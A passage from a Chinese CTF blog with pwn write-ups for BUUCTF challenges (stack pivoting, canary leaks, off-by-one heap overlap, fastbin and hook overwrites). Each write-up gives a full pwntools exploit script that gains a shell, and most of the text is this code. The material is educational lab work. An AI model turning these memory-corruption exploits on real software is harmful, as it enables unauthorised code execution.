class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./yakacmp&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./yakacmp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_add</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;add &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_sub</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;sub &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_chg</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;chg &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_mov</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;mov &#x27;</span> + reg1 + <span class="string">b&#x27;,&#x27;</span> + reg2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_ret</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;ret&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_code</span>(<span class="params">code</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;more operation?&#x27;</span>, code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    added = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>), <span class="number">0x80</span>):</span><br><span class="line">        code =    make_mov(<span class="string">b&#x27;r1&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x67616C66</span>).encode())</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;some code now&#x27;</span>, code)</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x72eb_00_b1188a</span> + (j &lt;&lt; <span class="number">24</span>)).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xf0ebdb314858</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xefeb23330f_00_68</span> + (i &lt;&lt; <span class="number">8</span>)).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xefeb050f58006a</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xf0eb5a406a5e</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xefeb23330f0068</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xefeb5f036a050f</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xefeb585f5e006a</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xefeb2333000268</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xf1eb00000002</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xfeeb1875cb38</span>).encode()))</span><br><span class="line">        send_code(make_mov(<span class="string">b&#x27;r2&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xc3</span>).encode()))</span><br><span class="line">        send_code(<span class="string">b&#x27;NO&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;over\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> io.connected():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;character #%d is not %c&#x27;</span> % (i, <span class="built_in">chr</span>(j)))</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(<span class="string">&#x27;./yakacmp&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            added = <span class="literal">True</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;character #%d : %c&#x27;</span> % (i, <span class="built_in">chr</span>(j)))</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(<span class="string">&#x27;./yakacmp&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> added:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        added = <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>exp中的<code>connected</code>方法测试<code>io</code>是否正常，前面加上0.2秒的延迟给shellcode一些执行的时间。</p><p><img src="https://img-blog.csdnimg.cn/af2fe2cf4d7942b38ffdfdfc96321b91.png"><br>成功get flag。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn write-ups (8)</title>
      <link href="/2023/02/28/buuctf-pwn-write-ups-8/"/>
      <url>/2023/02/28/buuctf-pwn-write-ups-8/</url>
      
        <content type="html"><![CDATA[<h1 id="buu062-gyctf-2020-borrowstack"><a href="#buu062-gyctf-2020-borrowstack" class="headerlink" title="buu062-gyctf_2020_borrowstack"></a>buu062-gyctf_2020_borrowstack</h1><p>栈迁移。常规的栈迁移方法是返回到leave指令，之前修改rbp到合适的值。我们将rbp修改到bss段的内部，将栈迁移到这里。需要注意不能将栈迁移到变量bank的开头，因为后面还需要调用puts等函数，往上可能会覆盖某些重要数据。因此迁移的地址应该尽量靠后（下面脚本中迁移的地址是bank+0xA0）。使用puts函数读取got表，获取到libc版本，然后使用one_gadget即可getshell。（经过尝试，本题使用system(“&#x2F;bin&#x2F;sh”)不可行，原因不明）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29767</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addrsp_8_ret = <span class="number">0x4004c5</span></span><br><span class="line">pop3_ret = <span class="number">0x4006ff</span></span><br><span class="line">poprdi_ret = <span class="number">0x400703</span></span><br><span class="line">poprsi_r15_ret = <span class="number">0x400701</span></span><br><span class="line">gadget = <span class="number">0x4006FA</span></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(<span class="number">0x601080</span> - <span class="number">8</span> + <span class="number">0xA0</span>)    <span class="comment"># new ebp</span></span><br><span class="line">payload += p64(<span class="number">0x400699</span>)    <span class="comment"># leave</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Tell me what you want\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xA0</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(poprsi_r15_ret)</span><br><span class="line">payload += p64(<span class="number">0x601080</span> + <span class="number">0x48</span> + <span class="number">0xA0</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])<span class="comment"># 仅设定了read函数的前两个参数，第三个参数size没有设置，但是是一个很大的值</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;stack now!\n&#x27;</span>, payload)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">payload = p64(base + one_gadgets[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu063-others-babystack"><a href="#buu063-others-babystack" class="headerlink" title="buu063-others_babystack"></a>buu063-others_babystack</h1><p>简单的canary泄露栈溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29017</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Input</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">    io.send(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Output</span>():</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">Input(cyclic(<span class="number">0x89</span>))</span><br><span class="line">Output()</span><br><span class="line">io.recv(<span class="number">0x88</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">canary &amp;= <span class="number">0xFFFFFFFFFFFFFF00</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x90</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">Input(payload)</span><br><span class="line">Output()</span><br><span class="line">io.recv(<span class="number">0x98</span>)</span><br><span class="line">retaddr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(retaddr))</span><br><span class="line">libc_start_main = retaddr - <span class="number">240</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main)</span><br><span class="line">base = libc_start_main - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload += p64(<span class="number">0x400A93</span>)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line">Input(payload)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu064-0ctf-2017-babyheap"><a href="#buu064-0ctf-2017-babyheap" class="headerlink" title="buu064-0ctf_2017_babyheap"></a>buu064-0ctf_2017_babyheap</h1><p>同第29题。</p><h1 id="buu065-hitcontraining-heapcreator"><a href="#buu065-hitcontraining-heapcreator" class="headerlink" title="buu065-hitcontraining_heapcreator"></a>buu065-hitcontraining_heapcreator</h1><p><img src="https://img-blog.csdnimg.cn/ee98c4fd428c48e5a5cce67ba8c49080.png"><br>容易得到程序控制的结构体如上，一共可以申请至多10个这样的结构体。包含创建、删除、打印、修改选项，其中修改选项中含有off by one漏洞。<br><img src="https://img-blog.csdnimg.cn/2dd662ca768446d3ae2390f0efe29bbd.png"><br>这里read_input函数中使用的是read函数，因此这一个溢出的字节可以是任何值。将这个字节的值变大会导致堆块重叠。<br><img src="https://img-blog.csdnimg.cn/7f8572fa62504c848ba59db286f7462d.png"></p><p>这里插一条笔记：</p><blockquote><p>如果使用free函数释放紧邻top chunk下面的大于最大fastbin容纳范围的chunk，当这个chunk的大小加上top chunk的大小大于FASTBIN_CONSOLIDATION_THRESHOLD（65536）时会触发malloc_consolidate()函数将所有的fastbin清空并归位到unsorted bins中。详情请见<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c">源码</a>第4054~4076行。调试中无意发现，在此记录，与本题关系不大。</p></blockquote><p>经过调试验证，证实上面的思路是正确的。我们成功通过off by one漏洞获取到一个chunk_info的读写权限。<br><img src="https://img-blog.csdnimg.cn/0104512ec7b74742b6584e81d26c8015.png"><br><img src="https://img-blog.csdnimg.cn/315403dbf3594750991e6053479fbac4.png"><br>那么，后面的思路也就清晰了：将后面一个chunk_info的可读写空间调大，获取到#4中的main_arena地址，进而计算libc基地址。然后直接将#3的可写地址改为__free_hook地址，写入one_gadget，再调用free函数即可getshell。<br><img src="https://img-blog.csdnimg.cn/f8373cceb674431d88068c1a464b4e90.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27833</span>)</span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Content of heap:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Content of heap : &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x48</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[0]</span></span><br><span class="line">create(<span class="number">0x48</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[1]</span></span><br><span class="line">create(<span class="number">0x48</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[2]</span></span><br><span class="line">edit(<span class="number">0</span>, cyclic(<span class="number">0x48</span>) + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[1]</span></span><br><span class="line">edit(<span class="number">1</span>, cyclic(<span class="number">0x40</span>) + p64(<span class="number">0x51</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x100</span>))  <span class="comment"># change the readable size of heaparray[2]</span></span><br><span class="line">create(<span class="number">0x88</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[3]</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[4]</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;aabcaab&#x27;</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">88</span></span><br><span class="line">__malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__malloc_hook&quot;</span>, __malloc_hook)</span><br><span class="line">base = __malloc_hook - libc.dump(<span class="string">&quot;__malloc_hook&quot;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">__free_hook = base + libc.dump(<span class="string">&quot;__free_hook&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面的这个payload是用来还原部分堆环境的</span></span><br><span class="line"><span class="comment"># 因为前面读取使用printf函数，在main_arena地址之前不能有空字节，所以会覆盖掉两个chunk的控制信息</span></span><br><span class="line"><span class="comment"># 这里将其还原，保证后面创建chunk的时候能够正常</span></span><br><span class="line">payload = cyclic(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)     <span class="comment"># change write address to __free_hook</span></span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[4], reallocate</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">payload += p64(__free_hook)     <span class="comment"># change write address to __free_hook</span></span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line">edit(<span class="number">3</span>, p64(base + one_gadgets[<span class="number">1</span>]))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu066-roarctf-2019-easy-pwn"><a href="#buu066-roarctf-2019-easy-pwn" class="headerlink" title="buu066-roarctf_2019_easy_pwn"></a>buu066-roarctf_2019_easy_pwn</h1><p>也是一道考察off by one漏洞的题目。<br>经过分析，本题使用的数据结构如下：一共可以创建至多16个这样的结构。<br><img src="https://img-blog.csdnimg.cn/d9fc61de667c4c83ba62a363b6514942.png"><br>在write_note实现函数中，当输入的size值是原来定义值-10时会触发一个off by one漏洞，能够溢出一个字节。<br><img src="https://img-blog.csdnimg.cn/8ddfaca95d8f48b9bc11c23df6963886.png"><br>可见本题的思路和上一题类似，但由于本题的堆环境不同，需要对利用姿势加以修改。<br><img src="https://img-blog.csdnimg.cn/7785923b09064a4aa9d59ff219f2d8ad.png"></p><p>如上图所示，我们通过off by one漏洞将下一个chunk的size改大，使其能够正好覆盖下一个chunk。由于可读写的空间大小保存在bss段，因此此时我们可读写的空间大小实际上并没有改变。然后将这个改大的chunk释放，这样就会产生一个和下一个chunk完全重合的free chunk，在内部保存有main_arena的地址。通过读取下一个chunk即可获取。<br><img src="https://img-blog.csdnimg.cn/a8952a896bc94888b02f240b7d30f34d.png"><br>获取到__malloc_hook的地址之后，我们可以通过上图的方式进行fastbin attack。同样是堆块重叠，但这次是将整个unsorted bin chunk都重新申请回来，通过中间的chunk #4修改chunk #5的fd指针到__malloc_hook，这样可以在接下来申请到__malloc_hook处的chunk。</p><p>然后，我们可以在__malloc_hook中写入one_gadget的地址。但经过测试发现，能够使用的4个one_gadget都不能让我们获得shell。通过one_gadget打印出来的地址可以知道，这些one_gadget想要执行是有一定条件的，如栈上某个地址需要为0，rax为0等等。如果直接将one_gadget写入__malloc_hook不行，可以考虑将one_gadget写到__realloc_hook中，在__malloc_hook中写realloc函数中的地址，注意我们想要修改栈的环境，需要写realloc+4的地址，这样可以避免执行push rbp; mov rbp, rsp这两条指令，从而产生8字节的错位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.buuoj.cn&#x27;, 25959)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># one_gadgets = [0x3f4b6, 0x3f50a, 0xd5a27]</span></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment"># one_gadgets = [0x45206, 0x4525a, 0xef9f4, 